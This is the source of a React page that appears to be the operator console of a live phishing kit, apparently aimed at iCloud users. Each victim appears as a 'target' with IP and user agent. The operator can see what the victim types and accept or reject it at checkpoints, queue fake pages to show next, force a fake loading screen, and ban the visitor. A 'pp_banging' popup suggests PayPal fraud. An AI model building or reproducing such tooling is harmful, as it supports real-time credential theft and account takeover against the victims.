'use client';

import { use, useState, useEffect } from "react";
import { trpc } from "@/lib/trpc-react";
import PresetSettingsModal from "../components/PresetSettingsModal";
import PpBangingRecommendationPopup from "../components/PpBangingRecommendationPopup";
import QueuePagesSidebar from "../components/QueuePagesSidebar";
import SortablePageList from "../components/flow/SortablePageList";
import Button from "../components/ui/Button";
import Card from "../components/ui/Card";
import { remapIndexOnMove } from "@/lib/flow-utils";

export default function SessionPage({ params }) {
  const resolved = use(params);
  const targetId = resolved?.targetId;
  const { data: target } = trpc.targets.getById.useQuery({ targetId }, { enabled: !!targetId });
  const { data: intakeState } = trpc.intakeState.getByTarget.useQuery({ targetId }, { enabled: !!targetId });
  const { data: gameplan } = trpc.gameplans.getByTarget.useQuery({ targetId }, { enabled: !!targetId });
  const { data: events = [] } = trpc.intakeEvents.listByTarget.useQuery({ targetId }, { enabled: !!targetId });
  const { data: pendingCheckpoints = [] } = trpc.checkpoints.listPendingByTarget.useQuery({ targetId }, { enabled: !!targetId });

  const endAndBanMutation = trpc.targets.endAndBan.useMutation();
  const setForceLoadMutation = trpc.intakeState.setForceLoad.useMutation();
  const setStepMutation = trpc.intakeState.setStep.useMutation();
  const updatePagesMutation = trpc.gameplans.updatePages.useMutation();
  const resolveDualMutation = trpc.checkpoints.resolveDual.useMutation();

  const currentStep = intakeState?.gameplan_step ?? 0;
  const pages = Array.isArray(gameplan?.pages) ? gameplan.pages : [];
  const [queuePages, setQueuePages] = useState([]);
  const [showPresetModal, setShowPresetModal] = useState(false);
  const [showQueueSidebar, setShowQueueSidebar] = useState(false);
  const [showRecommendationPopup, setShowRecommendationPopup] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined" && !localStorage.getItem("pp_banging_recommendation_dismissed")) {
      setShowRecommendationPopup(true);
    }
  }, []);

  useEffect(() => {
    setQueuePages(
      pages.map((page, index) => ({
        id: `${index}-${page?.name || "page"}`,
        name: page?.name || "",
      })),
    );
  }, [gameplan?.pages]);

  function dismissRecommendationPopup() {
    setShowRecommendationPopup(false);
    if (typeof window !== "undefined") {
      localStorage.setItem("pp_banging_recommendation_dismissed", "1");
    }
  }

  function visitorNickname(t) {
    return t?.id ? `Visitor ${String(t.id).slice(-6)}` : "Visitor";
  }

  async function handleReorderQueue({ oldIndex, newIndex, nextItems }) {
    setQueuePages(nextItems);
    const nextStep = remapIndexOnMove(currentStep, oldIndex, newIndex);
    try {
      await updatePagesMutation.mutateAsync({
        targetId,
        pages: nextItems.map((page) => ({ name: page.name })),
      });
      if (nextStep !== currentStep) {
        await setStepMutation.mutateAsync({ targetId, step: nextStep });
      }
    } catch (error) {
      setQueuePages(
        pages.map((page, index) => ({
          id: `${index}-${page?.name || "page"}`,
          name: page?.name || "",
        })),
      );
    }
  }

  if (!targetId) return <div>Invalid session</div>;

  return (
    <div className="session-page" style={{ display: "flex", flexDirection: "column", gap: "1.1rem" }}>
      <a href="/home" className="panel-muted" style={{ textDecoration: "none", fontSize: "0.9rem" }}>
        ← Back to Intake Monitor
      </a>

      <Card strong style={{ padding: "1rem" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "1rem" }}>
          <div>
            <h2 style={{ margin: "0 0 0.35rem" }}>{visitorNickname(target)}</h2>
            <p className="panel-card-subtitle" style={{ marginTop: 0 }}>{target?.ip || "—"} • Local time: Unknown</p>
            <p className="panel-card-subtitle">{target?.useragent?.slice(0, 55) || "—"}</p>
            <p style={{ marginTop: "0.45rem", marginBottom: 0 }}>
              <span>iCloud</span>
              <span className="panel-muted"> • </span>
              <span className="panel-muted">More visitor info unavailable</span>
            </p>
          </div>
          <div style={{ display: "flex", gap: "0.45rem", alignItems: "center", flexWrap: "wrap" }}>
            <span className="panel-chip panel-chip--success">Visitor Online</span>
            <Button onClick={() => endAndBanMutation.mutateAsync({ targetId })} variant="danger">
              End & Ban
            </Button>
          </div>
        </div>

        <div style={{ display: "flex", gap: "0.55rem", flexWrap: "wrap", marginTop: "0.95rem" }}>
          <Button onClick={() => setShowPresetModal(true)} variant="secondary">
            Manage presets
          </Button>
          <Button onClick={() => setShowQueueSidebar(true)} variant="primary">
            Queue pages
          </Button>
          <Button as="a" href="/home" variant="ghost" style={{ textDecoration: "none" }}>
            Check visitors
          </Button>
          <Button
            onClick={() => setForceLoadMutation.mutateAsync({ targetId, forceLoad: !intakeState?.force_load })}
            variant="warning"
          >
            Force loading screen {intakeState?.force_load ? "(on)" : "(off)"}
          </Button>
        </div>
      </Card>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "1rem" }}>
        <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
          <Card style={{ padding: "1rem" }}>
            <h3 style={{ marginTop: 0, marginBottom: "0.75rem" }}>Visitor Activity</h3>
            <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginBottom: "0.75rem" }}>
              <Button variant="ghost" title="Playback controls unavailable" disabled>-15</Button>
              <Button variant="ghost" title="Playback controls unavailable" disabled>▶</Button>
              <Button variant="ghost" title="Playback controls unavailable" disabled>+15</Button>
            </div>
            <div style={{ maxHeight: 230, overflow: "auto" }}>
              {events.slice(-10).reverse().map((e) => (
                <div key={e.id} style={{ padding: "0.4rem 0", borderBottom: "1px solid rgba(115,130,167,0.2)" }}>
                  {e.interaction_title || e.input_title || "—"} {e.input_value ? `(${e.input_value})` : ""}
                  <span className="panel-soft" style={{ fontSize: "0.75rem", marginLeft: "0.5rem" }}>
                    {e.created_at ? new Date(e.created_at).toLocaleTimeString() : ""}
                  </span>
                </div>
              ))}
            </div>
            <p className="panel-soft" style={{ margin: "0.6rem 0 0", fontSize: "0.82rem" }}>Showing recent actions</p>
          </Card>

          <Card style={{ padding: "1rem" }}>
            <h3 style={{ marginTop: 0, marginBottom: "0.75rem" }}>Submission Controls</h3>
            {pendingCheckpoints.length > 0 ? (
              <div style={{ display: "flex", flexDirection: "column", gap: "0.7rem" }}>
                {pendingCheckpoints.map((c) => (
                  <Card key={c.id} strong style={{ padding: "0.7rem" }}>
                    <div>
                      <span className="panel-muted">{c.input_title || c.checkpoint_resolution}: </span>
                      <strong>{c.input_value || "—"}</strong>
                    </div>
                    <div style={{ marginTop: "0.6rem", display: "flex", gap: "0.45rem" }}>
                      <Button
                        onClick={() => resolveDualMutation.mutateAsync({ targetId, resolution: c.checkpoint_resolution, dualOutcome: "good" })}
                        variant="success"
                      >
                        Accept
                      </Button>
                      <Button
                        onClick={() => resolveDualMutation.mutateAsync({ targetId, resolution: c.checkpoint_resolution, dualOutcome: "bad" })}
                        variant="danger"
                      >
                        Reject
                      </Button>
                    </div>
                  </Card>
                ))}
              </div>
            ) : (
              <p className="panel-soft" style={{ margin: 0 }}>No pending submissions</p>
            )}
          </Card>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
          <Card style={{ padding: "1rem" }}>
            <h3 style={{ marginTop: 0, marginBottom: "0.75rem" }}>Page Queue</h3>
            <SortablePageList
              items={queuePages}
              getItemId={(page) => page.id}
              onReorder={handleReorderQueue}
              renderItem={({ item: page, index: i, dragHandleProps }) => {
                const statusLabel = i < currentStep ? "Previous" : i === currentStep ? "Current" : "Upcoming";
                const chipClass = i === currentStep ? "panel-chip--success" : "panel-chip--muted";
                return (
                  <Card key={page.id} strong style={{ padding: "0.6rem 0.7rem" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: "0.6rem" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "0.55rem" }}>
                        <Button
                          variant="ghost"
                          className="panel-drag-handle"
                          aria-label={`Drag queue item ${i + 1}`}
                          title="Drag to reorder"
                          {...dragHandleProps}
                        >
                          ::
                        </Button>
                        <div>
                          <strong>{i + 1}. {page?.name || "—"}</strong>
                          <div>
                            <span className={`panel-chip ${chipClass}`} style={{ marginTop: "0.3rem" }}>{statusLabel}</span>
                          </div>
                        </div>
                      </div>
                      {i > currentStep ? (
                        <Button
                          variant="ghost"
                          onClick={() => {
                            setStepMutation.mutate({ targetId, step: i });
                          }}
                        >
                          Navigate -&gt;
                        </Button>
                      ) : null}
                    </div>
                  </Card>
                );
              }}
            />
          </Card>

          <Card style={{ padding: "1rem" }}>
            <h3 style={{ marginTop: 0, marginBottom: "0.75rem" }}>Visitor Submissions</h3>
            {events.filter((e) => e.type === "input" && e.input_title).map((e) => (
              <div key={e.id} style={{ padding: "0.5rem 0", borderBottom: "1px solid rgba(115,130,167,0.2)" }}>
                <strong>{e.input_title}:</strong> {e.input_value || "—"}
                <span className="panel-soft" style={{ fontSize: "0.75rem", marginLeft: "0.5rem" }}>
                  {e.created_at ? new Date(e.created_at).toLocaleString() : ""}
                </span>
                <span
                  style={{
                    color: e.checkpoint_status === "waiting" ? "var(--panel-warning)" : "var(--panel-success)",
                    marginLeft: "0.5rem",
                    fontSize: "0.8rem",
                  }}
                >
                  {e.checkpoint_status === "waiting" ? "Pending" : e.checkpoint_dual_outcome === "good" ? "Accepted" : "Auto accepted"}
                </span>
              </div>
            ))}
            {events.filter((e) => e.type === "input").length === 0 && (
              <p className="panel-soft" style={{ margin: 0 }}>No submissions yet</p>
            )}
          </Card>
        </div>
      </div>
      {showPresetModal && <PresetSettingsModal targetId={targetId} onClose={() => setShowPresetModal(false)} />}
      {showQueueSidebar && <QueuePagesSidebar targetId={targetId} onClose={() => setShowQueueSidebar(false)} />}
      {showRecommendationPopup && <PpBangingRecommendationPopup onDismiss={dismissRecommendationPopup} />}
    </div>
  );
}
